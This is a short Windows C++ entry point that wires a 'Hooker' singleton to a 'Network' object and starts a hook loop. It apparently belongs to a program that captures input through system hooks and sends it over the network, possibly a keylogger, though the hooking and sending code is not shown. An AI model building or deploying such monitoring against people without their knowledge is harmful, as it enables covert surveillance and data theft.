#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include "Hooker.hh"
#include "reseau/Network.hh"

int main()
{
	Hooker& hooker = Hooker::getInstance();
	Network* network = new Network();
	hooker.setNetwork(network);

	hooker.runHookLoop();
}
